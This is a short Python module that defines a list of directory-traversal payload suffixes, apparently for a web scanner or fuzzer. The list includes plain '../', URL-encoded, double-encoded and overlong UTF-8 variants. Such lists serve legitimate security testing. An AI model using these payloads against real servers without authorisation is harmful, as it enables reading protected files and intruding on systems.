"""Directory-traversal / path-normalization suffixes appended after the target path."""

TRAVERSAL_PAYLOADS = [
    "../../", "../..", "/..;/", "..,/", "..,", "/..,", "..;/", "/..;\\",
    "%c0%af", "%c0%ae%c0%af", "..%2f", "..%5c", "%2e%2e%2f", "%2e%2e/",
    "..%255c", "..//", "..%c0%af", "..%c1%9c", "%c0%ae%c0%ae/",
    "..%25c0%25af", "/..%c0%af", "../%c0%af../", "%%32%65%%32%65/",
    "..%255c..%255c", "..%5c..%5c", "%252e%252e%252f", "%252e%252e/",
]
